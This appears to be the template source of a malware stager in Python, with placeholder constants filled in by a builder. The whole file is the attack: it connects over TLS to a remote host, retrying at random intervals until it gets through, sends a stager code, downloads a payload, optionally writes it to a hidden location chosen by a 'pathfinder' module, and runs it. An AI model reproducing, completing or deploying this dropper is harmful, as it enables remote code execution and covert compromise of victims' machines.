import subprocess
import ssl
import json
import socket
import time
import random
import os

from lib import pathfinder

# Constants
IP = addr_ip
PORT = addr_port

BLOCK_SIZE = block_size
STAGER_CODE = stager_code
PAYLOAD_FILE = output_file

HIDE_PAYLOAD = hide_payload

# sock obj
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)

# connect
sess = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)

while True:
    try:
        sess.connect((IP, PORT))
        break
    except:
        time.sleep(random.randint(15, 30))

# request payload
sess.sendall(json.dumps({'code': STAGER_CODE, 'args': None}).encode())

# download payload
payload = b''

while True:
    try:
        payload += sess.recv(BLOCK_SIZE)
    except:
        break

# write to file
path = os.path.join(pathfinder.Finder().find(),
                    PAYLOAD_FILE) if HIDE_PAYLOAD else PAYLOAD_FILE

with open(path, 'wb') as f:
    for i in range(0, len(payload), BLOCK_SIZE):
        f.write(payload[i:i + BLOCK_SIZE])

# execute
subprocess.call([path])
